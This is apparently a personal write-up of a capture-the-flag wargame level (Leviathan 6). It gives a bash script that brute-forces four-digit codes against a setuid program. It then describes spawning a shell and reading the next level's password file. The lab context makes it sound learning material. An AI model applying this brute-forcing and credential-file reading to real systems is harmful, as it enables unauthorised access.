#!/bin/bash

for i in $(seq -f "%04g" 0 9999)
do
    output=`/home/leviathan6/leviathan6 "$i"`
    match=`echo "$output" | grep -cE "Wrong"`
    echo "$i" >> output.txt
    if [[ $match -ne 1 ]]
    then
	touch success.txt
	echo "i = $i" >> success.txt
	echo "SUCCESS" >> success.txt
	echo "$output" >> success.txt
    fi
done

The above is the shell script I used. I put this on the server is a tmp
directory, touched output.txt first (not sure if >> creates a file if it doesn't
exist). I followed this file with tail -f output.txt in another ssh session. I
noticed that it stopped after printing 7122. So I tried executing ~/leviathan6
"7123", this gave me the /bin/sh shell. I then executed cat
/etc/leviathan_pass/leviathan7 to get the next password. Not really any reverse
engineering required since the sample space is pretty small. This may not be the
intended solution. But hey I solved it myself!

On the next lab there is a file called CONGRATULATIONS with contents:

Well Done, you seem to have used a *nix system before, now try something more serious.
